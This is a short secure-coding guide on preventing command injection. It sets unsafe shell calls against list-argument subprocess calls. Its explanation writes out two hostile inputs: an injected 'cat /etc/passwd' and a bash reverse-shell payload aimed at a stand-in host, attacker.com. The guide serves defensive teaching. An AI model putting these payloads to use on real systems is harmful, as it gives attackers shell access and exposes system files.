# Command Injection Prevention

**OWASP:** A03 — Injection
**Risk Level:** Critical
**Applies to:** Applications that invoke system commands, shell scripts, or subprocesses with user input

---

## What Is Command Injection?

Command injection occurs when user-supplied data is passed to a system shell without proper handling. The shell interprets the input as part of the command string, executing attacker-supplied instructions with the privileges of the application process.

An application that pings a user-supplied hostname:

```python
os.system("ping -c 1 " + hostname)
```

An attacker supplying `google.com; cat /etc/passwd` gets both commands executed. A payload of `google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1` establishes a reverse shell. The attacker now has interactive access to the server.

---

## The Primary Defence: Avoid the Shell

The best protection is to not pass user input to a shell at all. Most use cases have safer alternatives:

- File operations → use built-in file I/O APIs
- HTTP requests → use an HTTP client library, not curl
- Image processing → use library bindings (Pillow, Sharp), not ImageMagick CLI
- Archive operations → use library bindings, not tar or zip
- DNS lookups → use the language's DNS resolution APIs

---

## When a Subprocess Is Necessary

Use an API that accepts command and arguments as a list — this bypasses shell interpretation entirely:

**Unsafe:**
```python
subprocess.call("convert " + filename + " output.png", shell=True)
```

**Safe:**
```python
subprocess.call(["convert", filename, "output.png"])
```

Shell metacharacters (`; | & $ ( ) { } > <`) have no special meaning when arguments are passed as a list. The shell is never invoked.

---

## Available Snippets

| Language | Level | File |
|----------|-------|------|
| Python | 🟢 Beginner | python-beginner.py |
| Python | 🔴 Advanced | python-advanced.py |
| Node.js | 🟢 Beginner | node-beginner.js |
| Go | 🔴 Advanced | go-advanced.go |
| Ruby | 🟡 Intermediate | ruby-intermediate.rb |
| Java | 🟡 Intermediate | java-intermediate.java |
